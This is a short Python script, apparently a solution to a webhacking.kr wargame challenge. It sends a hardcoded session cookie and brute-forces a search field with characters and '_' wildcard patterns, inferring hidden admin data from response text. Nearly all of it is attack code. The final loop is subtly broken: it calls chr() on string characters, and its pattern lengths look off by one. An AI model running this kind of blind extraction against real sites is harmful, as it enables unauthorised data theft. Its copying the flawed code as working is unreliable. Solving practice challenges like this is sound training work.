import requests

session_id={'PHPSESSID':'62e4e5213d3cb10a6a17ab27225c609f'}

result=''
for i in range(32,127):
	url = "http://webhacking.kr/challenge/web/web-33/index.php"		
	params={'search':str(chr(i))}
	response = requests.post(url=url,cookies=session_id,data=params)
	if "admin" in response.text:
		result+=chr(i)
	print(chr(i))
			
print("result : ",result)

length='_'
length_num=1
while(True):
	url = "http://webhacking.kr/challenge/web/web-33/index.php"
	params={'search':length}		
	response=requests.post(url=url,cookies=session_id,data=params)
	if "admin" in response.text:
		length=length+"_"
		length_num+=1
	else:
		length_num-=1
		break
print("length :",length_num)

result='.0hkp'
readme=''
for i in range(length_num):
	for j in result:
		search = "_"*i + chr(j) +"_"*(length_num-i)
		url = "http://webhacking.kr/challenge/web/web-33/index.php"
		params={'search':search}		
		response=requests.post(url=url,cookies=session_id,data=params)
		if "admin" in response.text:
			readme+=chr(j)
			break